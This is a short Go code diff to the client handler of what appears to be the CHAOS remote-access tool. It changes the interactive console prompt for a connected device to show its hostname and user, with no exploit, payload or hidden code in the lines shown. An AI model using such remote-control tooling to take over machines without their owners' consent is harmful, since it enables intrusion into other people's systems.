@@ -1,6 +1,7 @@
 package client
 
 import (
+	"fmt"
 	"github.com/c-bata/go-prompt"
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/internal/handler"
@@ -21,11 +22,11 @@ func NewClientHandler(conn net.Conn) handler.Client {
 	}
 }
 
-func (c ClientHandler) HandleConnection() {
+func (c ClientHandler) HandleConnection(hostname, user string) {
 	p := prompt.New(
 		c.executor,
 		completer.ClientCompleter,
-		prompt.OptionPrefix("device > "),
+		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
 		prompt.OptionPrefixTextColor(prompt.White),
 	)
 	p.Run()
